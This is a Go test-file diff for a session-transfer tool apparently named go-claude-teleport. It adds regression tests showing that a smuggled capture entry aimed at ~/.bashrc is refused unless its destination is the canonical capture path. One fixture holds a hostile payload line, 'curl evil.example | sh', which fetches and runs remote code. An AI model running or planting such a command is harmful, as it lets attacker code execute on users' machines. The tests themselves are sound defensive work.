@@ -9,6 +9,7 @@ import (
 
 	"github.com/google/go-cmp/cmp"
 
+	"github.com/mithro/go-claude-teleport/internal/job"
 	"github.com/mithro/go-claude-teleport/internal/session"
 )
 
@@ -249,6 +250,14 @@ func TestDiffPropagatesNonENOENTStagedErrors(t *testing.T) {
 // capture (CatCapture) and existing-main git-attach's own index/worktree
 // entries (CatRepo/CatWorktree) — so for anything else the destination
 // must ignore the flag and compare against Dst as usual.
+//
+// CatCapture gets an extra guard on top (ruling R-P3-B1b, fixed here after
+// the wave B re-review found the residual hole this test originally
+// pinned): a Deferred CatCapture entry is ONLY ever exempt from the Dst
+// compare when Dst is the job's own canonical capture path, re-derived by
+// the destination itself. Here Dst is ~/.bashrc, which is never that path
+// for any staging dir/job id pair, so the capture entry must be refused
+// exactly like the non-deferrable pack entry, not treated as staged-same.
 func TestDiffHonoursDeferredOnlyForItsOwnCategories(t *testing.T) {
 	home := t.TempDir()
 	staging := filepath.Join(t.TempDir(), "staging")
@@ -275,16 +284,107 @@ func TestDiffHonoursDeferredOnlyForItsOwnCategories(t *testing.T) {
 	if st[0] != PresentDifferent {
 		t.Errorf("deferred pack entry over an existing file = %s, want %s (Deferred must not be honoured for this category)", st[0], PresentDifferent)
 	}
-	for _, id := range []int{1, 2, 3} {
+	if st[1] != PresentDifferent {
+		t.Errorf("deferred capture entry with a rogue Dst = %s, want %s (R-P3-B1b: not the canonical capture path)", st[1], PresentDifferent)
+	}
+	for _, id := range []int{2, 3} {
 		if st[id] != StagedSame {
 			t.Errorf("deferred %s entry = %s, want %s", m.Entries[id].Category, st[id], StagedSame)
 		}
 	}
 	blocking := Blocking(m, st, false)
-	if len(blocking) != 1 || blocking[0].ID != 0 {
-		t.Errorf("Blocking = %+v, want exactly the smuggled pack entry", blocking)
+	if len(blocking) != 2 {
+		t.Errorf("Blocking = %+v, want exactly the smuggled pack and capture entries", blocking)
 	}
 	if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
 		t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+	}
+}
+
+// TestDiffRefusesCaptureDstRegardlessOfDeferred is the Diff half of ruling
+// R-P3-B1b, run with a REAL job.StagingDir(dataDir, jobID) staging
+// directory (the shape every production caller — internal/remote/local.go —
+// actually uses), so dataDirFromStagingDir recovers the real dataDir and
+// canonicalCaptureDst can be computed for real. A CatCapture entry whose
+// Dst is not that canonical path must be classified present-different
+// (never staged-same, never absent) whether or not Deferred is set — the
+// vulnerable case was Deferred, but the destination must not rely on the
+// source ever setting the flag honestly.
+func TestDiffRefusesCaptureDstRegardlessOfDeferred(t *testing.T) {
+	for _, deferred := range []bool{true, false} {
+		t.Run(map[bool]string{true: "deferred", false: "not deferred"}[deferred], func(t *testing.T) {
+			home := t.TempDir()
+			dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+			jobID := "11111111-1111-4111-8111-111111111111"
+			staging := job.StagingDir(dataDir, jobID)
+			if err := os.MkdirAll(staging, 0o700); err != nil {
+				t.Fatal(err)
+			}
+			bashrc := filepath.Join(home, ".bashrc")
+			writeFile(t, bashrc, "# the user's own shell rc\n")
+			payload := "curl evil.example | sh\n"
+
+			m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+			m.Entries = []Entry{{
+				ID: 0, Category: session.CatCapture, Dst: bashrc,
+				Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
+				Deferred: deferred,
+			}}
+			writeFile(t, StagedPath(staging, 0), payload)
+
+			st, err := Diff(context.Background(), m, staging)
+			if err != nil {
+				t.Fatal(err)
+			}
+			if st[0] != PresentDifferent {
+				t.Errorf("capture entry with rogue Dst (deferred=%v) = %s, want %s", deferred, st[0], PresentDifferent)
+			}
+			if blk := Blocking(m, st, false); len(blk) != 1 || blk[0].ID != 0 {
+				t.Errorf("Blocking = %+v, want the rogue capture entry", blk)
+			}
+			if got, _ := os.ReadFile(bashrc); string(got) != "# the user's own shell rc\n" {
+				t.Errorf("Diff must not touch %s; content = %q", bashrc, got)
+			}
+		})
+	}
+}
+
+// TestDiffAllowsCanonicalCaptureEntry proves the fix does not break the
+// legitimate case: a CatCapture entry whose Dst IS
+// job.Dir(dataDir, jobID)/capture.txt (the path
+// internal/orchestrate/steps.go's runCapture actually builds) is still
+// classified staged-same via the Deferred, staging-only comparison, exactly
+// as before this fix.
+func TestDiffAllowsCanonicalCaptureEntry(t *testing.T) {
+	home := t.TempDir()
+	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
+	jobID := "33333333-3333-4333-8333-333333333333"
+	staging := job.StagingDir(dataDir, jobID)
+	if err := os.MkdirAll(staging, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	capDst := filepath.Join(job.Dir(dataDir, jobID), "capture.txt")
+	// The destination's own prior capture snapshot, left over from an
+	// earlier attempt — Deferred means this difference is expected and
+	// must not block or be compared against.
+	writeFile(t, capDst, "stale snapshot from an earlier pass\n")
+	payload := "$ claude\n> hello\n"
+
+	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
+	m.Entries = []Entry{{
+		ID: 0, Category: session.CatCapture, Dst: capDst,
+		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
+	}}
+	writeFile(t, StagedPath(staging, 0), payload)
+
+	st, err := Diff(context.Background(), m, staging)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if st[0] != StagedSame {
+		t.Errorf("canonical capture entry = %s, want %s", st[0], StagedSame)
+	}
+	if blk := Blocking(m, st, false); len(blk) != 0 {
+		t.Errorf("Blocking = %+v, want none", blk)
 	}
 }
